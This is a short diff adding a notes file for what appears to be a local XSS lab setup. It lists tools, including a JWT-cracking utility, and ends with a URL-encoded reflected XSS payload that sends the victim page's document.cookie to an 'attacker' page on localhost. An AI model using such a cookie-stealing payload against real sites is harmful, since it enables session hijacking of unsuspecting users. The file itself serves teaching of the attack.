@@ -1,0 +1,7 @@
+xampp
+database
+node
+npm
+https://github.com/lmammino/jwt-cracker
+live-server
+http://localhost/XSS_example/victim/products.php?search=%3Cscript%3Ewindow.location.replace(`http://localhost/XSS_example/attacker/index.html?${document.cookie}`)%3C/script%3E
